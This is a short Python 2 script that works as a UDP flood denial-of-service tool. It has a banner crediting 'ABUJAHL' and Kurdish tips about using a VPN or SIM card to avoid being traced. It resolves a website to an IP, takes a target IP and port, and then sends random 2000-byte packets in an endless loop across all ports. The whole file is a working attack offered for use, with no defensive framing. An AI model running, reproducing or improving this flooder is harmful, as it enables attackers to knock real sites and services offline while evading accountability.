import socket
import os 
import time 
import random
import sys 
os.system("clear")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(2000)

banner = """
 

 █████╗ ██████╗ ██╗   ██╗       ██╗ █████╗ ██╗  ██╗██╗
██╔══██╗██╔══██╗██║   ██║       ██║██╔══██╗██║  ██║██╗
███████║██████╦╝██║   ██║       ██║███████║███████║██║
██╔══██║██╔══██╗██║   ██║  ██╗  ██║██╔══██║██╔══██║██║
██║  ██║██████╦╝╚██████╔╝  ╚█████╔╝██║  ██║██║  ██║███████╗
╚═╝  ╚═╝╚═════╝  ╚═════╝    ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
 _____________________________________________________________________________
AUTHOR   :ABUJAHL
TIPS     :XATY SIM KART YAN VPN BAKAR BENA TA BASHTR ESH BKA
NOTE     :SNAPAKAM ADD KA : ITZ_TAMO 
_______________________________________________________________________________
"""

print '\033[01;96m' + (banner)


idk = raw_input('LINKY SITE DANE BO DARHENANI IP:')


print ('                      ')
url = "idk"


print (
'AMASH IP:',socket.gethostbyname(idk))
print ('                      ')

print '\033[01;97m' + ('Copy Paste IP BKA BO DASPEKRDN ;) ')
print ('                      ')
print'\033[01;95m' + ('                      ')
ip = raw_input("IP Target  : ")
port = input("Port       : ")

os.system("clear")
os.system("ABUJAHL Ddos Attack")
time.sleep(2)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
